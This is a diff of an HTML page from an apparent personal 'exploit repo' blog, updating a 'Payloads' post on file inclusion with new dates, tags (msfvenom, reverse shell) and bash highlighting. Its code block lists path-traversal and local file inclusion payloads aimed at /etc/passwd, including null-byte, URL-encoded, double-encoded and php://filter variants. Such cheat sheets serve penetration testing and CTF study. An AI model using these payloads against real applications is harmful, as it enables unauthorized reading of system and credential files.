@@ -10,7 +10,7 @@
 <meta property='og:description' content='Payloads that I use often'>
 <meta property='og:url' content='https://sudo-echo-jin.github.io/p/file-inclusion/'>
 <meta property='og:site_name' content='Jin&#39;s Exploit Repo'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='payload' /><meta property='article:published_time' content='2022-03-06T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-03-06T00:00:00&#43;00:00'/><meta property='og:image' content='https://sudo-echo-jin.github.io/p/file-inclusion/payload.jpg' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='payload' /><meta property='article:tag' content='msfvenom' /><meta property='article:tag' content='reverse shell' /><meta property='article:published_time' content='2022-12-19T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-12-19T00:00:00&#43;00:00'/><meta property='og:image' content='https://sudo-echo-jin.github.io/p/file-inclusion/payload.jpg' />
 <meta name="twitter:title" content="Payloads">
 <meta name="twitter:description" content="Payloads that I use often"><meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content='https://sudo-echo-jin.github.io/p/file-inclusion/payload.jpg' />
@@ -243,7 +243,7 @@
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">Mar 06, 2022</time>
+                <time class="article-time--published">Dec 19, 2022</time>
             </div>
         
 
@@ -321,12 +321,12 @@
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/etc/passwd
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/etc/passwd
 </span></span><span class="line"><span class="cl">../../../../../../etc/passwd
-</span></span><span class="line"><span class="cl">../../../../../../etc/passwd%00 # works on php version &lt;= 5.3.4
-</span></span><span class="line"><span class="cl">%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd # url encode
-</span></span><span class="line"><span class="cl">%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd # url encode twice
-</span></span><span class="line"><span class="cl">php://filter/convert.base64-encode/resource=PAYLOAD # wrapper
+</span></span><span class="line"><span class="cl">../../../../../../etc/passwd%00 <span class="c1"># works on php version &lt;= 5.3.4</span>
+</span></span><span class="line"><span class="cl">%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd <span class="c1"># url encode</span>
+</span></span><span class="line"><span class="cl">%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd <span class="c1"># url encode twice</span>
+</span></span><span class="line"><span class="cl">php://filter/convert.base64-encode/resource<span class="o">=</span>PAYLOAD <span class="c1"># wrapper</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div>
@@ -338,6 +338,10 @@
     <section class="article-tags">
         
             <a href="/tags/payload/">payload</a>
+        
+            <a href="/tags/msfvenom/">msfvenom</a>
+        
+            <a href="/tags/reverse-shell/">reverse shell</a>
         
     </section>
 
@@ -379,7 +383,7 @@
                         width="1920" 
                         height="2880" 
                         loading="lazy"
-                        alt="Featured image of post Windows Basic"
+                        alt="Featured image of post Windows Fundamental"
                         data-key="windows-resource" 
                         data-hash="md5-AjwOuxZqvlbd/1AsSkwkGQ==">
                 
@@ -387,7 +391,7 @@
         
 
         <div class="article-details">
-            <h2 class="article-title">Windows Basic</h2>
+            <h2 class="article-title">Windows Fundamental</h2>
         </div>
     </a>
 </article>
